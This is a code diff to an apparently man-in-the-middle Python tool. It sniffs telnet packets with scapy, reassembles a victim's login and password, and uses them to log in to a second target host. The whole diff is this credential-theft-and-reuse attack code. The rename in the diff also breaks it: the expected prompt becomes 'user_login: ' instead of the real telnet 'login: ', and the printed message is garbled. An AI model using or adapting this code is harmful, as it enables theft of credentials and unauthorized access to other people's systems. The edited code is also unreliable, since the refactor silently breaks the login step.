@@ -5,17 +5,16 @@ from scapy.all import *
 
 from src.mitm.utils import get_mac
 
-str_login = ""
-str_password = ""
-login = []
-password = []
+user_login = []
+user_password = []
 counter = 0
+target2_ip = ""
 
 
 def get_telnet_credentials(pkt):
     global counter
-    global login
-    global password
+    global user_login
+    global user_password
 
     try:
         pkt.getlayer(Raw).load
@@ -25,11 +24,11 @@ def get_telnet_credentials(pkt):
 
     payload = str(pkt.getlayer(Raw).load)
     if payload != "b'\\r\\x00'" and counter == 1:
-        login.append(payload[2])
+        user_login.append(payload[2])
         return
 
     elif payload != "b'\\r\\x00'" and counter == 2:
-        password.append(payload[2])
+        user_password.append(payload[2])
         return
 
     elif payload == "b'\\xff\\xfd\\x01'":
@@ -39,7 +38,7 @@ def get_telnet_credentials(pkt):
     elif payload == "b'\\r\\x00'":
         counter = counter + 1
         if counter == 3:
-            use_telnet_credentials(login, password)
+            use_telnet_credentials(user_login, user_password)
         else:
             return
     else:
@@ -47,18 +46,21 @@ def get_telnet_credentials(pkt):
 
 
 def use_telnet_credentials(login, password):
-    global target2_ip, str_login, str_password
+    global target2_ip
+
+    str_login = ""
+    str_password = ""
 
     for i in login:
         str_login = str_login + i
     for j in password:
         str_password = str_password + j
 
-    print("user login: " + str_login + "| user password: " + str_password)
+    print("user user_login: " + str_login + "| user user_password: " + str_password)
 
     try:
         tn = telnetlib.Telnet(target2_ip)
-        tn.read_until(b"login: ", 2)
+        tn.read_until(b"user_login: ", 2)
         tn.write(str_login.encode('ascii') + b"\n")
         tn.read_until(b"Password: ", 2)
         tn.write(str_password.encode('ascii') + b"\n")
@@ -86,6 +88,7 @@ def use_telnet_credentials(login, password):
 
 
 def run():
+    global target2_ip
     try:
         target = raw_input("Enter Desired Interface [eth0]: ")
         if target == "":
